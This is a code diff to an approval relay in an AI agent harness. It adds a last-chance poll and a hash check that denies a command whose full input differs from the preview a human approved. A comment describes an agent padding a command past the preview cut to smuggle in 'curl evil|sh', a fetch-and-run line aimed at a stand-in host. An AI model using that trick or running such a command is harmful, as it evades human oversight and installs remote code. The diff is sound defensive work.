@@ -435,6 +435,20 @@ async def request_approval(
         rec = poll.json()
         if rec.get("status") != "pending":
             return rec
+    # M5: the client deadline and the server TTL race, and we only poll
+    # every 2s — a decision made in the final gap was being discarded as
+    # "expired" while the human's CLI said "approved". Check once more
+    # before giving up.
+    try:
+        final = await _request_with_refresh(
+            "GET", f"{s.RELAY_URL}/v1/approvals/{approval_id}",
+        )
+        if final.status_code == 200:
+            rec = final.json()
+            if rec.get("status") != "pending":
+                return rec
+    except Exception:
+        pass
     rec["status"] = "expired"
     return rec
 
@@ -468,6 +482,31 @@ async def approve(
             "message": f"approval relay unreachable ({exc.__class__.__name__})",
         }
     if rec.get("status") == "approved":
+        # The human approved a 200-char PREVIEW; this returns the FULL
+        # input to the harness. Re-hash it and refuse if it is not the
+        # exact payload that was reviewed — otherwise an agent can pad a
+        # command past the preview cut ("git status ####…; curl evil|sh")
+        # and ride an approval granted for something benign.
+        expected = rec.get("input_digest")
+        if expected:
+            import hashlib as _hashlib
+            import json as _json
+
+            try:
+                canonical = _json.dumps(input, sort_keys=True, default=repr)
+            except Exception:
+                canonical = repr(input)
+            actual = _hashlib.sha256(
+                canonical.encode("utf-8", "replace")
+            ).hexdigest()
+            if actual != expected:
+                return {
+                    "behavior": "deny",
+                    "message": (
+                        "input changed after approval — the reviewed request "
+                        "does not match what would run"
+                    ),
+                }
         return {"behavior": "allow", "updatedInput": input}
     if rec.get("status") == "denied":
         who = rec.get("decided_by") or "a human"
